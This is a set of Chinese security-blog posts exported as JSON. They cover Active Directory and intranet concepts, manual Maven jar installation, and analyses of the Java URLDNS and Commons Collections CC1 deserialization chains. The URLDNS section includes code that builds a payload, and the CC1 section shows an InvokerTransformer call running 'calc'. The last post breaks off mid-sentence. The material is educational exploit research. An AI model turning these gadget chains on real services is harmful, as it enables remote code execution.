[{"title":"Windows 内网基础知识","path":"/2024/05/10/内网渗透/Windows 内网基础知识/","content":"本文将会详细介绍工作组、域、域控制器、父域、子域、域树、域森林（也叫域林）、活动目录、DMZ、域内权限等内网知识。 一、内网基础知识1.1 基础知识在研究的时候通常会听到工作组、域、域控制器、父域、子域、域树、域森林（也叫域林）、活动目录、DMZ、域内权限等名词，接下来讲得就是这些名词各指的是什么，之间有什么区别。 1.1.1 工作组将局域网内的计算机按照需要分组。 加入工作组后，在网络中别人可以访问我们的共享资源，我们也可以加入同一网络中的任何工作组了，工作组可以自由的进入和退出，方便计算机互相访问，但是工作组没有集中管理的作用，工作组的所有计算机都是对等的! 1.1.2 域什么是域: 域可以理解为升级版的工作组，是一个有安全边界的计算机集合，和工作组相比较而言，域安全管理控制机制更严格，如果用户们要访问域需要以合法的身份登录域才行，而用户登录域后能访问到的资源权限，还要取决于用户域内的身份。域内资源由一台域控制器（Domain Controller，DC）集中管理，用户名和密码是放在域控制器去验证的。 什么是域控制器（Domain Controller，DC）: 域控制器是域中一台类似管理服务器的计算机，通俗可以理解成域控制器是一个单位的门禁系统，负责所有接入的计算机和用户的验证工作，在域环境中各个计算机要想互相访问，需要经过域的审核才行。重要的是域控制器中存在这个域的账户和密码，属于这个域的计算机等信息构成的数据库。当计算机连接到域时，域控制器首先会鉴别计算机是否属于这个域，用户在进行登录用户名密码时，会验证用户名和密码是否存在和正确，如果有一项不正确，域控制器就会拒绝该计算机访问域，相对而言就计算机不通过域控制器就无法访问相对应的资源权限。通过以上理解，域控制器就是整个域的通信枢纽，所有的权限身份验证都在域控制器上进行着，所以在渗透中，散列值就体现出来了，域内所有用来验证身份的账号和密码散列值都保存在域控制器中。 域的几种环境： 1、单域 即只有一个域的网络环境，一般需要两台 DC ，一台 DC ，另一台备用DC（容灾）。 2、父域和子域 域数量过多的情况下需要进行管理，进行分级管理的情况下，第一个域称为父域，下级各部分的域称为该域的子域。 举个例子理解下，一大型公司存在各个分公司，分公司位于不同的地点，这种情况就需要父域和子域，如果把所有分公司都放在一个域内，在信息交互的时候会出现带宽高延迟高，浪费非常多的时间，交互的信息量变大不会压缩的情况下会导致崩溃的现象，而在多个域之间进行信息交互，量就相对较小，且信息量可以压缩。在管理和安全层面，不同的子域也可以指定特定的安全策略。 在子域和父域这里就了解到，一个域管理员只能管理本域，不能访问和管理其他域，如果需要互相访问则需要建立信任关系，信任关系就是连接不同域的桥梁，不同域之间建立了信任关系后，就能实现网络资源共享与管理，通信及数据传输等。 3、域树 多个域通过建立信任关系组成的集合。若两个域之间需要相互访问，需要建立信任关系（Trust Relation），通过信任关系可以将父子域连接成树状结构。 继续了解下域树的阶层概念，域树的阶层是按照点号隔开区分的，一个点号代表一个层次，例如：域 yizhi.xiaobai.com 的级别比域 xiaobai.com 级别低。子域只能使用父域的名字作为其域名的后缀，所以在域树中域的名字是连续的。 4、域森林 多个域树通过建立信任关系后的集合。 例如在一个公司进行兼并的时候，公司目前使用的域树是 abc.com ，被兼并的公司存在自己的域树为 dayu.net ，在这种情况下进行兼并，就需要域树 abc.com 和域树 dayu.net 之间建立信任关系来构成域森林。 5、域名服务器 域名服务器就是 DNS 服务器，是用于实现域名与对应的 IP 地址相互转换的服务器。 回头观望下域树的知识可知，域树中的域名和 DNS 域名非常的相似（ xiaobai.com 等)，实际上，域中的计算机是使用 DNS 来定位域控制器、服务器、网络服务等，所以域的名字就是 DNS 域的名字。 所 以在内网渗透中，大多数情况都是通过寻找 DNS 服务器来确定域控制器的位置，因为域控制器和 DNS 服务器都配置在同一台机器上。 1.1.3 活动目录活动目录（Active Directory，AD）是指域环境中提供目录服务的组件。首先来了解下目录，目录用于存储有关的网络对象（例如，用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是指帮助用户快速准确的从目录中找到其所需要的信息服务。所以活动目录实现了目录服务，为企业提供了网络环境的集中式管理机制。 如果是一本字典，活动目录就是索引。 目录数据存储在域控制器上的 Ntds.dit 文件中。我们建议将该文件存储在一个 NTFS 分区上。有些数据保存在目录数据库文件中，而有些数据则保存在一个被复制的文件系统上，例如登录脚本和组策略。 注：活动目录功能 账号集中管理：所有的账号均存储在服务器中，方便执行命令和密码重置等操作。 软件集中管理：统一推送软件、安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择需要安装的软件。 环境集中管理：统一客户端桌面、ID、TCP&#x2F;IP 协议等设置。 增强安全性：统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机访问权限、统—制定用户密码策略等。可以监控网络、对资料进行统一管理。 更可靠，更短的宕(dang)机时间。例如，利用活动目录控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设置。 活动目录是微软提供的统一管理基础平台，工 SA 、Exchange、SMS 等都依赖这个平台。 1.1.4 域控制器和活动目录的区别把网络中的众多对象（计算机、用户、用户组、打印机、共享文件等）分门别类、并然有序的放在一个大的仓库中，并将检索信息整理好，以便查找、管理和使用这些对象（资源)。这个拥有层次结构的数据库，就是活动目录数据库，简称 AD 库。 那么我们应该把这个数据库放到哪套计算机上呢？要实现域环境，其实就是要安装 AD 。如果内网中的一台计算机上安装了活动目录（AD），它就成了域控制器（DC）用于存储活动目录数据库的计算机。 域控制器就是安装了活动目录（Active Directory）的计算机。 1.1.5 安全域的划分在一个用路由器连接的内网中，可以将网络划分为三个区域：安全级别最高的内网，安全级别中等的 DMZ ，安全级别最低的外网。这三个区域负责完成不同的任务，因此需要设置不同的访问策略。接下来这里详细的讲解了防火墙的一些场景，在三个区域中如何制定 ACL 的思路。 内网（安全级别最高）：分为核心区（存储企业最重要的数据，只有很少的主机能够访问）和办公区（员工日常工作区，一般能够访问 DMZ ，部分主机可以访问核心区） DMZ（Demilitarized Zone，边界网络，隔离区，安全级别中等）：作为内网中安全系统和非安全系统之间的缓冲区，用于对外提供服务，一般可以放置一些必须公开的服务器设施 外网（Internet，安全级别最低） 1.1.6 域中计算机的分类在域结构的网络中，计算机的身份是不平等的，有域控制器、成员服务器、客户机、独立服务器四种类型。 1、域控制器 域控制器用于管理所有的网络访问，包括登录服务器、访问共享目录和资源，域控制器中存储了域内所有的账户和策略信息，包括安全策略、用户身份验证信息和账户信息。 之前也有了解到很多域控制器，在大型域环境中，存在多个域控制器的情况下，部分域控制器瘫痪，网络访问也不会受到影响，提高了网络的安全性和稳定性。 2、成员服务器 安装了服务器操作系统（比如 Windows Server ）并加入了域，但没有安装活动目录的计算机，主要任务是提供网络资源。 3、客户机 安装了其他操作系统的计算机，利用这些计算机和域中的账户就可以登录到域。 4、独立服务器 独立服务器和域没有关系，服务器不加入域、也不安装活动目录就是独立服务器。 1.1.7 域内权限解读1、域本地组 多域用户访问单域资源（访问同一个域）。 可以从任何域添加用户账户、通用组和全局组，但只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限。 2、全局组 单域用户访问多域资源（必须是一个域里面的用户）。 只能在创建该全局组的域中添加用户和全局组。可以在域森林的任何域内指派权限。全局组可以嵌套在其他组中。 可以将某个全局组添加到同一个域的另一个全局组中，或者添加到其他域的通用组和域本地组中（不能添加到不同域的全局组中，全局组只能在创建它的域中添加用户和组）。虽然可以通过全局组授予用户访问任何域内资源的权限，但一般不直接用它来进行权限管理。 全局组和域本地组的关系，与域用户账号和本地账号的关系类似。域用户账号可以在全局使用，即在本域和其他关系的其他域中都可以使用，而本地账号只能在本机中使用。例如：将用户张三（Z3）添加到域本地组 Administrators 中，并不能使 Z3 对非 DC 的域成员计算机拥有任何特权。但若将 Z3 添加到全局组 Domain Admins 中，用户张三就成为了域管理员了（可以在全局使用，对域成员计算机拥有特权）。 3、通用组 多域用户访问多域资源。 通用组的成员可包括域树或域林中任何域的用户账号、全局组和其他通用组，可以在该域森林的任何域中指派权限，可以嵌套在其他组中，非常适合在域森林内的跨域访问中使用。不过，通用组的成员不是保存在各自的域控制器中，而是保存在全局编录（GC）中，任何变化都会导致全林复制。 全局编录通常用于存储一些不经常发生变化的信息。由于用户账号信息是经常变化的，建议不要直接将用户账号添加到通用组中，而要先将用户账号添加到全局组中，再把这些相对稳定的全局组添加到通用组中。 简单一句话概括： 域本地组：来自全林，作用于本域 全局组：来自本域，作用于全林 通用组：来自全林，作用于全林 4、A-G-DL-P 策略 A-G-DL-P 策略是指将用户账号添加到全局组中，再将全局组添加到域本地组中，然后为域本地组分配资源权限。 A 表示用户账号（Account） G 表示全局组（Global Group） U 表示通用组（Universal Group） DL 表示域本地组（Domain Local Group） P 表示资源权限（Permission） 按照 A-G-DL-P 策略对用户进行组织和管理是非常容易的。在 A-G-DL-P 策略形成以后，当需要给一个用户添加某个权限时，只要把这个用户添加到某个域本地组中就行了。 5、内置组 在安装域控制器时，系统会自动生成一些组，称为内置组。内置组定义了一些常用的权限。通过将用户添加到内置组中可以使用户获得相应的权限。 活动目录控制台窗口的 Builtin 和 Users 组织单元中的组就是内置组。 内置的域本地组在 Builtin 组织单元中。 内置的全局组合通用组在 Users 组织单元中。 6、几个比较重要的域本地组 管理员组（Administrators）：该组的成员可以不受限制地存取计算机&#x2F;域内的资源。它不仅是最具权利的一个组，也是在活动目录和域控制器中默认具有管理员权限的组。该组的成员可以更改 Enterprise Admins、Schema Admins 和 Domain Admins 组的成员关系，是域森林中强大的服务管理组。 远程登录组（Remote Desktop Users）：该组的成员具有远程登录权限。 打印机操作员组（Print Operators）：该组的成员可以管理网络打印机，包括建立，管理及删除网络打印机，并可以在本地登录和关闭域控制器。 账号操作员组（Account Operators）：该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器。但是，不能更改属于 Administrators 或 Domain Admins 组的账号，也不能更改这些组。在默认情况下，该组中没有成员。 服务器操作员组（Server Operators）：该组的成员可以管理域服务器，其权限包括建立、管理、删除任意服务器的共享目录、管理网络打印机、备份任何服务器的文件、格式化服务器硬盘、锁定服务器、变更服务器的系统时间、关闭域控制器等。在默认情况下，该组中没有成员。 备份操作员组（Backup Operators）：该组的成员可以在域控制器中执行备份和还原操作，并可以在本地登录和关闭域控制器。在默认情况下，该组中没有成员。 7、几个比较重要的全局组、通用组的权限 域管理员组（Domain Admins）：该组的成员在所有加入域的服务器、域控制器和活动目录中均默认拥有完整的管理员权限。因为该组会被添加到自己所在域的 Administrators 组中，所以可以继承 Administrators 组的所有权限。同时，该组默认会被添加到每台域成员计算机的本地 Administrators 组中。这样，Domain Admins 组就获得了域中所有计算机的所有权。如果希望某用户成为域系统管理员，建议将该用户添加到 Domain Admins 组中，而不要直接将该用户添加到 Administrators 组中。 企业系统管理员组（Enterprise Admins）：该组是域森林根域中的一个组。该组在域森林中的每个域内都是 Administrators 组的成员，因此对所有域控制器都有完全访问权。 域用户组（Domain Users）：该组是所有的域成员，在默认情况下，任何由我们建立的用户账号都属于 Domain Users 组，而任何由我们建立的计算机账号都属于 Domain Computers 组。因此，如果想让所有的账号都获得某种资源存取权限，可以将该权限指定给域用户组，或者让域用户组属于具有该权限的组。域用户组默认是内置域 Users 组的成员。 架构管理员组（Schema Admins）：该组是域森林根域中的一个组，可以修改活动目录和域森林的模式。该组是为活动目录和域控制器提供完整权限的域用户组，因此，该组成员的资格是非常重要的。","categories":["内网渗透"]},{"title":"配置篇 - Maven 手动下载与导入依赖","path":"/2024/05/10/Java 安全/配置篇-Maven手动下载与导入依赖/","content":"遇到 maven 无法自动导入的依赖怎么办，本文介绍了如何手动下载与导入 maven 依赖 遇到 maven 无法自动导入的依赖怎么办推荐博客：maven 项目手动导入 jar 包依赖 第一步，在网上下载依赖 jar 包比较推荐 nowjava （时代java）这个网站。 比如我要下载 javax.el-api-3.0.0.jar ，那么访问网址 https://nowjava.com/jar/detail/m03040939/javax.el-api-3.0.0.jar.html 即可，往下翻，有下载 jar 包的链接： 下载好之后复制文件路径：”C:\\Users\\miaoj\\Downloads\\javax.el-api-3.0.0.jar” 。 第二步，idea 中导入 jar 包file &#x3D;&gt; project Structure &#x3D;&gt; modules &#x3D;&gt; Dependencies &#x3D;&gt; 点击加号 &#x3D;&gt; 选择第一项 JARs or Directories 将文件地址粘贴进去，确定即可。 第三步，将 jar 包手动添加到 maven 本地仓库中打开 idea 的 Terminal 终端进入 Windows 命令提示符，输入以下命令： 1mvn install:install-file -Dfile=&quot;C:\\Users\\miaoj\\Downloads\\javax.el-api-3.0.0.jar&quot; -DgroupId=javax.el -DartifactId=javax.el-api -Dversion=3.0.0 -Dpackaging=jar -DgroupId：pom 文件中的 groupId -DartifactId：pom 文件中的 artifactId -Dversion：pom 文件中的 version -Dpackaging：导入包的类型，这里是 jar 类型 -Dfile：jar 包所在路径 在执行结果中可以看到 jar 包已被导入 maven 本地仓库： 完成之后，查看 pom.xml 文件可以发现原来的依赖不再爆红： 12345&lt;dependency&gt; &lt;groupId&gt;javax.el&lt;/groupId&gt; &lt;artifactId&gt;javax.el-api&lt;/artifactId&gt; &lt;version&gt;3.0.0&lt;/version&gt;&lt;/dependency&gt;","categories":["Java 安全"]},{"title":"漏洞篇 - URLDNS 利用链分析","path":"/2024/05/10/Java 安全/漏洞篇-URLDNS利用链分析/","content":"本文详尽地讲述了 URLDNS 反序列化利用链的原理 URLDNS 利用链分析推荐博客：JAVA反序列化-ysoserial-URLDNS原理分析 URLDNS 反序列化利用链的结果就是发起一次 URL 请求，在 DNS 服务器上留下一条解析记录，常常作为验证漏洞是否存在的手段。 具体的利用点在 URL 类的 hashcode 函数中在 Java 中，hashCode() 是 Object 类中的一个方法，用于返回一个对象的哈希码（hash code），该哈希码是一个 int 类型的数值，代表了该对象的特定标识符。 哈希码的主要作用是在集合中进行元素的快速查找，比如在 HashMap 和 HashSet 中。 先来看一个简单的示例： 首先在 Yakit 上生成一个可用域名：ihqkfolumv.dgrh3.cn 写好如下 Java 程序： 12345678910import java.net.MalformedURLException;import java.net.URL;public class Main &#123; public static void main(String[] args) throws MalformedURLException &#123; // 调用URL类的hashCode方法发起DNS请求 URL url = new URL(&quot;http://ihqkfolumv.dgrh3.cn&quot;); url.hashCode(); &#125;&#125; 其中，ihqkfolumv.dgrh3.cn 是我们自己生成的域名，用于被 Java 程序访问，这样在 DNS 服务器上就会留下一条访问记录。 运行后在 Yakit 这里会留下一条解析记录： 下面来查看源代码了解原理Ctrl + 鼠标左键点击进入 URL 类的 hashcode 方法： 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; 可以看到，这里先做了一个判断，然后调用了 handler 的 hashCode 方法。而 handler 是 URL 类中定义的一个属性： 1transient URLStreamHandler handler; 接着 Ctrl + 鼠标左键点击进入 handler 对象（也即 URLStreamHandler 类）的 hashcode 方法： 123456789101112131415161718192021222324252627282930313233343536protected int hashCode(URL u) &#123; int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) &#123; h += addr.hashCode(); &#125; else &#123; String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); &#125; // Generate the file part. String file = u.getFile(); if (file != null) h += file.hashCode(); // Generate the port part. if (u.getPort() == -1) h += getDefaultPort(); else h += u.getPort(); // Generate the ref part. String ref = u.getRef(); if (ref != null) h += ref.hashCode(); return h;&#125; 这个方法传入一个 URL 类作为参数，依次通过调用 getProtocol ，getHostAddress，getFile，getPort，getRef 等方法获取到传入的 URL 链接的 Protocol（协议），HostAddress（主机地址），File（文件路径），Port（端口），Ref（锚点，即 # 后面的部分），获取完之后，对每部分调用它们的 hashCode 方法，将结果加到 h 上，最后将 h 返回。 不过，我们需要重点关注的是 getHostAddress 方法，该方法会返回一个 IP 地址，如果遇到的是域名，那么就需要发起 DNS 请求来将其解析成 IP 地址。 Ctrl + 鼠标左键点击进入 getHostAddress 方法： 123456789101112131415161718protected synchronized InetAddress getHostAddress(URL u) &#123; if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.equals(&quot;&quot;)) &#123; return null; &#125; else &#123; try &#123; u.hostAddress = InetAddress.getByName(host); &#125; catch (UnknownHostException ex) &#123; return null; &#125; catch (SecurityException se) &#123; return null; &#125; &#125; return u.hostAddress;&#125; 如果 u.hostAddress 为空，那么调用 URL 类的 getHost 方法获取主机地址（可以是 IP 也可以是域名），如果获取到的主机地址不为空，那么会调用 InetAddress 类的静态方法 getByName 并将主机名作为参数传入。 重点来了：InetAddress.getByName 是一个强大而实用的方法，它允许我们根据主机名获取对应的 IP 地址，并在各种网络应用场景中发挥巨大的作用。 在这里就涉及到了 DNS 解析，那么这条利用链的功能也就是归于此处。再往下的源码就不看了，有兴趣可以自己看看。 反序列化利用入口类 HashMap选择该类作为入口类的原因很简单： 实现了 Serializable 接口，可以被反序列化 1public class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, Serializable 重写了 readObject 方法 参数类型宽泛，只要是 Object 都可以 JDK 自带 …… 构造 payload先看结果，后面再讲原理 序列化类 serialization 123456789101112131415public class serialization &#123; public static void main(String[] args) throws Exception &#123; HashMap hashMap = new HashMap(); URL url = new URL(&quot;http://jhdmbaithu.dgrh3.cn&quot;); Class clazz = Class.forName(&quot;java.net.URL&quot;); Field f = clazz.getDeclaredField(&quot;hashCode&quot;); f.setAccessible(true); hashMap.put(url,&quot;test&quot;); f.set(url,-1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;)); oos.writeObject(hashMap); &#125;&#125; 这个类将 URL 类的对象作为参数传入 hashMap 中，并在 hashMap 用 put 方法将数据存储后利用反射修改了 url 的 hashCode 属性为 -1 。运行后，会将序列化数据输出到 out.bin 文件中，且也会进行一次 DNS 解析。 由于进行了 DNS 解析，本地存在了解析记录，那么第二次解析就不会去请求 DNS 服务器，所以要刷新一下本地的 DNS 缓存，防止之后执行反序列化看不到解析记录 Windows cmd 窗口输入以下命令刷新 DNS 解析缓存： 1ipconfig/flushdns 反序列化类 unserialization 123456public class unserialization &#123; public static void main(String[] args) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;)); HashMap hashMap = (HashMap) ois.readObject(); &#125;&#125; 执行反序列化后会多出一条解析记录。 执行完序列化和反序列化之后，查看 Yakit ，会出现两次解析记录： 序列化时进行 DNS 解析的原理来看序列化类： 123456789101112131415public class serialization &#123; public static void main(String[] args) throws Exception &#123; HashMap hashMap = new HashMap(); URL url = new URL(&quot;http://jhdmbaithu.dgrh3.cn&quot;); Class clazz = Class.forName(&quot;java.net.URL&quot;); Field f = clazz.getDeclaredField(&quot;hashCode&quot;); f.setAccessible(true); hashMap.put(url,&quot;test&quot;); f.set(url,-1); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;out.bin&quot;)); oos.writeObject(hashMap); &#125;&#125; 序列化时调用了 HashMap 的 put 方法，查看 put 方法： 123public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; put 方法中又调用了 HashMap 的 hash 方法，查看 hash 方法： 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 可以看到，hash 方法中调用了 key 的 hashCode 方法，而 key 就是我们传入的 URL 对象，也即调用了 URL 对象的 hashCode 方法，因此进行了 DNS 解析。 为什么要用反射修改 url 的 hashCode 属性值 调用了 url 的 hashCode 方法之后，url 的 hashCode 属性便不再是 -1（初始值为 -1 ，调用 hashCode 方法之后会生成新的值），结合 URL 类的 hashCode 方法来看： 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; 下一次调用 url 的 hashCode 方法就不会再调用 handler.hashCode 方法，也就不会进行 DNS 解析了。为了之后的反序列化能够顺利进行 DNS 解析，这里用反射来修改 url 的 hashCode 属性值重新为 -1 。 反序列化时进行 DNS 解析的原理来看反序列化类： 123456public class unserialization &#123; public static void main(String[] args) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;out.bin&quot;)); HashMap hashMap = (HashMap) ois.readObject(); &#125;&#125; 由于 HashMap 重写了 readObject 方法，因此在调用时不会调用 ObjectInputStream 默认的 readObject 方法，而是会调用 HashMap 重写的 readObject 方法。 查看 HashMap 的 readObject 方法： 12345678910111213141516171819202122232425262728293031323334353637383940private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125;&#125; 很多很杂，但其实前面的都不重要，直接看末尾的 for 循环中的最后一条语句： 1putVal(hash(key), key, value, false, false); 见过吧，其实跟序列化时的 put 方法中的内容是一样的，一样的调用了 hash 方法： 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 一样的调用了 key 的 hashCode 方法，也即 URL 对象的 hashCode 方法，进行了 DNS 解析。所以如果前面不把 hashCode 改回 -1 的话，反序列化是不会进行 DNS 解析的哦~","categories":["Java 安全"]},{"title":"漏洞篇 - Java 反序列化之 CC1 链","path":"/2024/05/10/Java 安全/漏洞篇-CC1链分析/","content":"Apache Commons Collections 是对 java.util.Collection 的扩展，对常用的集合操作进行了很好的封装、抽象和补充，在保证性能的同时大大简化代码。CC 链正是在 Commons Collections 包中的反序列化利用链，本次介绍的是 CC1 链。 CC1 链Apache Commons Collections 是对 java.util.Collection 的扩展，对常用的集合操作进行了很好的封装、抽象和补充，在保证性能的同时大大简化代码。 CC 链正是在 Commons Collections 包中的反序列化利用链，本次介绍的是 CC1 链。 环境准备 java &#x3D; 8u65 CommonsCollections &#x3D; 3.2.1 12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt; Transformer 接口Apache Commons Collections 包中定义的一个接口，该接口的实现类中包含执行类。 12345package org.apache.commons.collections;public interface Transformer &#123; Object transform(Object var1);&#125; 该类中声明了一个 transform 方法。 鼠标双击选中类名后，Ctrl + H 可以查看该类的继承关系： 执行类 InvokerTransformer该类实现了 Transformer 接口与 Serializable 接口，定义如下： 1public class InvokerTransformer implements Transformer, Serializable 利用点在 InvokerTransformer 类重写的 transform 方法中：1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var4) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException var5) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException var6) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, var6); &#125; &#125;&#125; 其中， 123Class cls = input.getClass();Method method = cls.getMethod(this.iMethodName, this.iParamTypes);return method.invoke(input, this.iArgs); 会通过反射执行 “input” 类的 “this.iMethodName” 方法，并将 “this.iParamTypes” 类型的参数 “this.iArgs” 传入。 再来看， input 是 transform 方法的参数，iMethodName ，iParamTypes 和 this.iArgs 都是 InvokerTransformer 中定义的属性： 123private final String iMethodName;private final Class[] iParamTypes;private final Object[] iArgs; 并且在 InvokerTransformer 类的三参构造方法中会赋值： 12345public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args;&#125; 也就是说，这里的所有参数均可控，那么可以简单的写个小程序验证一下。 直接利用 InvokerTransformer 弹出计算器12345678public class Demo1 &#123; public static void main(String[] args) &#123; Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); invokerTransformer.transform(runtime); &#125;&#125; 运行结果： 成功弹出计算器，原理就是通过 invokerTransformer.transform 调用了 runtime 对象的 exec 方法并将 “calc” 作为参数传入。 接下来就是要找谁调用了 transform 方法，其实 TransformedMap 类调用了此方法。 利用链之 TransformedMap 类TransformedMap 类的 checkSetValue 方法调用了 this.valueTransformer 的 transform 方法： 123protected Object checkSetValue(Object value) &#123; return this.valueTransformer.transform(value);&#125; 而 valueTransformer 是 TransformedMap 中定义的属性： 1protected final Transformer valueTransformer; 这个属性在构造方法中被赋值： 12345protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; super(map); this.keyTransformer = keyTransformer; this.valueTransformer = valueTransformer;&#125; 由于构造方法是 protected 修饰的，不能直接被调用，所以还要找是谁调用了 TransformedMap 的构造方法。 TransformedMap 的 decorate 方法调用了 TransformedMap 的构造方法： 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; 通过这个方法，我们可以将 valueTransformer 属性赋值成 InvokerTransformer 类的对象。 接下来还要找是谁调用了 TransformedMap 的 checkSetValue 方法，AbstractInputCheckedMapDecorator 类调用了此方法。 利用链之 AbstractInputCheckedMapDecorator 类AbstractInputCheckedMapDecorator 是 TransformedMap 的父类。 MapEntry 静态内部类在这个类中有一个名为 MapEntry 的静态内部类： 12345678910111213static class MapEntry extends AbstractMapEntryDecorator &#123; private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent; &#125; public Object setValue(Object value) &#123; value = this.parent.checkSetValue(value); return this.entry.setValue(value); &#125;&#125; MapEntry 的 setValue 方法中调用了 this.parent 的 checkSetValue 方法： 1234public Object setValue(Object value) &#123; value = this.parent.checkSetValue(value); return this.entry.setValue(value);&#125; parent 是 MapEntry 中定义的一个私有属性： 1private final AbstractInputCheckedMapDecorator parent; 这个属性在 MapEntry 的构造方法中被赋值： 1234protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123; super(entry); this.parent = parent;&#125; 由于这个构造方法是被 protected 修饰的，所以还是要找是谁调用了它。其实是隔壁的静态内部类 EntrySetIterator 调用了它。 EntrySetIterator 静态内部类EntrySetIterator 也是 AbstractInputCheckedMapDecorator 中的静态内部类： 12345678910111213static class EntrySetIterator extends AbstractIteratorDecorator &#123; private final AbstractInputCheckedMapDecorator parent; protected EntrySetIterator(Iterator iterator, AbstractInputCheckedMapDecorator parent) &#123; super(iterator); this.parent = parent; &#125; public Object next() &#123; Map.Entry entry = (Map.Entry)this.iterator.next(); return new MapEntry(entry, this.parent); &#125;&#125; 可以看到 EntrySetIterator 的 next 方法中调用了 MapEntry 的构造方法： 1234public Object next() &#123; Map.Entry entry = (Map.Entry)this.iterator.next(); return new MapEntry(entry, this.parent);&#125; 那么为了调用 EntrySetIterator 的 next 方法，我们需要创建一个 EntrySetIterator 对象，但 EntrySetIterator 的构造方法是被 protected 修饰的，所以还要找是谁调用了 EntrySetIterator 的构造方法。 而在隔壁的静态内部类 EntrySet 中调用了 EntrySetIterator 的构造方法 EntrySet 静态内部类EntrySet 也是 AbstractInputCheckedMapDecorator 中的静态内部类： 123456789101112131415static class EntrySet extends AbstractSetDecorator &#123; private final AbstractInputCheckedMapDecorator parent; protected EntrySet(Set set, AbstractInputCheckedMapDecorator parent) &#123; super(set); this.parent = parent; &#125; public Iterator iterator() &#123; return new EntrySetIterator(this.collection.iterator(), this.parent); &#125; // 后面的部分省略 ......&#125; EntrySet 的 iterator 方法调用了 EntrySetIterator 的构造方法，同理，在哪里获得 EntrySet 对象呢？ entrySet 成员方法AbstractInputCheckedMapDecorator 类的 public 方法 entrySet 调用了 EntrySet 的构造方法： 123public Set entrySet() &#123; return (Set)(this.isSetValueChecking() ? new EntrySet(this.map.entrySet(), this) : this.map.entrySet());&#125; 但是到这里还有个问题，获得 EntrySet 对象后怎么去调用它的 iterator 方法呢，以及获得 EntrySetIterator 对象后怎么去调用它的 next 方法呢，这个可以通过增强 for 